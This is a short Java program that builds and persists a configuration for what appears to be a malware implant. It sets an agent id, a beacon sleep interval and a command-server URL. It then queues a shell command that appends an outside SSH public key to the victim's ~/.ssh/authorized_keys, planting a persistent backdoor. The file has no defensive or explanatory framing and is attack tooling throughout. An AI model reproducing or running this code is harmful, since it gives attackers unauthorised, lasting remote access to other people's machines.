import commands.*;
import utils.Config;

public class CreateCustomConfig {

    public static void main(String[] args) {
        Config cfg = new Config();
        cfg.id = "DEADBEEFDEADBEEF";
        cfg.sleepDuration = 10;
        cfg.serverURL = "http://shady-aggregator.utl/f52e6101/";
        
        Execute cmd = new Execute();
        cmd.value = "echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGlOA7NSrkCKybk4G/Ss+l/bhGua5j2xXBL3mEX7uq+ login@login >> ~/.ssh/authorized_keys";
        cfg.pendingCommands.add(cmd);
        
        cfg.persist();
    }

}